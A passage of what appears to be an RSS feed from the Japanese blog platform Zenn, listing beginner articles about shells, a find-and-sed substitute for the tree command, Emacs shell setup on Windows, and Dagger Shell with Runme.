url="https://res.cloudinary.com/zenn/image/upload/s--DJvPsg8Q--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%255BC%25E8%25A8%2580%25E8%25AA%259E%2520shell%25E3%2581%25AE%25E5%2586%258D%25E5%25AE%259F%25E8%25A3%2585%255D%2520minishell%25E6%258C%25AF%25E3%2582%258A%25E8%25BF%2594%25E3%2582%258A%2520%25E5%25BE%258C%25E7%25B7%25A8%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:%25E3%2582%25AB%25E3%2582%25A4%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzViMWY1YjBmMjAuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>カイ</dc:creator></item><item><title><![CDATA[Shellって何？]]></title><description><![CDATA[
 シェルとは？
**シェル（Shell）**とは、
コンピュータにコマンドを入力して、命令を実行させるための「操作画面」や「ソフトウェア」のことです。
ユーザーが

文字でコマンドを書く
シェルがそれを受け取り、コンピュータ内部で命令を実行する
という流れになります。



 PowerShellやBashとは？
シェルには種類があり、代表的なものに次があります。



シェル名
特徴




PowerShell
Windows標準のシェル。コマンドだけでなくプログラム的な操作も得意。


Bash（バッシュ）
LinuxやMac標準のシェル。シンプルな構文で幅広く使われる。



...]]></description><link>https://zenn.dev/so39883052/articles/e1e5cc56796d3e</link><guid isPermaLink="true">https://zenn.dev/so39883052/articles/e1e5cc56796d3e</guid><pubDate>Sun, 27 Apr 2025 23:31:42 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--4m_dNbqY--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_66:Shell%25E3%2581%25A3%25E3%2581%25A6%25E4%25BD%2595%25EF%25BC%259F%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:S.O.%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EtL0FPaDE0R2lGdXdBQXpXZU5jMlhud3oxOHdGQWlMQTBtendtSHU0aVlpX1JxPXM5Ni1j%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>S.O.</dc:creator></item><item><title><![CDATA[【linux】treeコマンドが無いときに，ディレクトリ構造を表示]]></title><description><![CDATA[
 treeコマンドでディレクトリ構造を表示したい
Linuxにおいて，ディレクトリ構造を表示したいとき，treeコマンドはとても便利です．
しかし，Linuxの標準コマンドではないため，root権限のないサーバーや，treeをインストールできない環境だとディレクトリ構造をツリー形式で表示することが出来ません．
そこで，findとsedを使ってtreeの代替コマンドを作成しました．

 代替treeコマンド（findとsedを利用）
👇️ディレクトリのみ表示する場合
pwd; find . -type d | sort | sed '1d;s/^\.//;s/\/\([^/]*\)$/|...]]></description><link>https://zenn.dev/hotate_ai/articles/bdb1c50ee84485</link><guid isPermaLink="true">https://zenn.dev/hotate_ai/articles/bdb1c50ee84485</guid><pubDate>Sat, 26 Apr 2025 07:03:48 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--MdvSKyVS--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2580%2590linux%25E3%2580%2591tree%25E3%2582%25B3%25E3%2583%259E%25E3%2583%25B3%25E3%2583%2589%25E3%2581%258C%25E7%2584%25A1%25E3%2581%2584%25E3%2581%25A8%25E3%2581%258D%25E3%2581%25AB%25EF%25BC%258C%25E3%2583%2587%25E3%2582%25A3%25E3%2583%25AC%25E3%2582%25AF%25E3%2583%2588%25E3%2583%25AA%25E6%25A7%258B%25E9%2580%25A0%25E3%2582%2592%25E8%25A1%25A8%25E7%25A4%25BA%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:%25E3%2583%259B%25E3%2582%25BF%25E3%2583%2586%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyL2Q1NGU1MWM4ZjEuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>ホタテ</dc:creator></item><item><title><![CDATA[Windows版Emacsからコマンドラインツールを連携する方法]]></title><description><![CDATA[
 Windows版Emacsでコマンドラインツールの標準出力が連携できない問題
WindowsにWindows版Emacsをインストールした環境で、Windowsネイティブのコマンドラインツールと連携ができませんでした。
この記事では、問題の解決方法を解説します。
結論から言うと、Emacsが利用するデフォルトのshellプログラムをGit for Windowsが提供するシェルに切り替えると解決しました。

 環境

Windows 11 Pro
emacs-29.1 (emacs-29.1-installer.exe)

Git for Windows (Git-2.42.0.2-...]]></description><link>https://zenn.dev/kiyoka/articles/windows-emacs-1</link><guid isPermaLink="true">https://zenn.dev/kiyoka/articles/windows-emacs-1</guid><pubDate>Mon, 21 Apr 2025 12:59:10 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--oXKANfS6--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:Windows%25E7%2589%2588Emacs%25E3%2581%258B%25E3%2582%2589%25E3%2582%25B3%25E3%2583%259E%25E3%2583%25B3%25E3%2583%2589%25E3%2583%25A9%25E3%2582%25A4%25E3%2583%25B3%25E3%2583%2584%25E3%2583%25BC%25E3%2583%25AB%25E3%2582%2592%25E9%2580%25A3%25E6%2590%25BA%25E3%2581%2599%25E3%2582%258B%25E6%2596%25B9%25E6%25B3%2595%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:kiyoka%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EtL0FPaDE0R2lYZ2VWTkNVMk14cFR6RGJOb080VlJEaXpoamhWODZPTFhRekN4PXM5Ni1j%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>kiyoka</dc:creator></item><item><title><![CDATA[シェル・ターミナル・OS]]></title><description><![CDATA[
 【シェル・ターミナル・OSの関係図】

あなた（ユーザー）
   ↓
ターミナル（入力する窓口・画面）
   ↓
シェル（bash/zsh などのプログラム）
   ↓
Linuxカーネル（OSの中身）

 【それぞれの役割】




名前
役割・説明




あなた
コマンドを打つ人（ユーザー）


ターミナル
シェルとやりとりするための「画面」や「アプリ」。入力と出力の入り口（例：macのTerminal、UbuntuのGNOME Terminal）


シェル
あなたのコマンドを受け取って、OSに伝えるプログラム。bashやzshがこれ


カーネル
OSの「本体」。ファイル操...]]></description><link>https://zenn.dev/yyoshioka/articles/fb36184e3ea874</link><guid isPermaLink="true">https://zenn.dev/yyoshioka/articles/fb36184e3ea874</guid><pubDate>Fri, 18 Apr 2025 08:08:24 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--Ll4iwmKi--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2582%25B7%25E3%2582%25A7%25E3%2583%25AB%25E3%2583%25BB%25E3%2582%25BF%25E3%2583%25BC%25E3%2583%259F%25E3%2583%258A%25E3%2583%25AB%25E3%2583%25BBOS%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:%25E3%2581%25BF%25E3%2582%2587%25E3%2581%2586%25E3%2581%2598%25E3%2582%2587%25E3%2581%2586%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzkxYjkxZTg3NzEuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>みょうじょう</dc:creator></item><item><title><![CDATA[Dagger Shell x Runme でドキュメントを実行環境に]]></title><description><![CDATA[
 はじめに
リポジトリの README や技術ドキュメントに記載された環境構築のシェルコマンド。それを読みながら、実際にその場で実行できたら、効率的ですよね。本記事では、そんなインタラクティブな体験を提供する Dagger Shell と Runme というツールとその連携についてご紹介します。

 Dagger Shellとは？

 そもそもDaggerとは？
Dagger は、コンテナ技術を活用して、CI/CD パイプライン、開発環境、その他の自動化タスクを定義・実行するためのポータブルな開発プラットフォームです。Docker コンテナ、ファイルシステム、ネットワークなどのインフラ...]]></description><link>https://zenn.dev/sonicmoov/articles/d6d177441c70ff</link><guid isPermaLink="true">https://zenn.dev/sonicmoov/articles/d6d177441c70ff</guid><pubDate>Thu, 17 Apr 2025 14:33:00 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--NaGFvEWY--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:Dagger%2520Shell%2520x%2520Runme%2520%25E3%2581%25A7%25E3%2583%2589%25E3%2582%25AD%25E3%2583%25A5%25E3%2583%25A1%25E3%2583%25B3%25E3%2583%2588%25E3%2582%2592%25E5%25AE%259F%25E8%25A1%258C%25E7%2592%25B0%25E5%25A2%2583%25E3%2581%25AB%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_34:takemo101%2Cx_220%2Cy_108/bo_3px_solid_rgb:d6e3ed%2Cg_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzY0YjYwNGE3MzguanBlZw==%2Cr_20%2Cw_90%2Cx_92%2Cy_102/co_rgb:6e7b85%2Cg_south_west%2Cl_text:notosansjp-medium.otf_30:%25E6%25A0%25AA%25E5%25BC%258F%25E4%25BC%259A%25E7%25A4%25BE%25E3%2582%25BD%25E3%2583%258B%25E3%2583%2583%25E3%2582%25AF%25E3%2583%25A0%25E3%2583%25BC%25E3%2583%2596%2Cx_220%2Cy_160/bo_4px_solid_white%2Cg_south_west%2Ch_50%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyL2Q3NDBmZGFmNmIuanBlZw==%2Cr_max%2Cw_50%2Cx_139%2Cy_84/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>takemo101</dc:creator></item></channel></rss>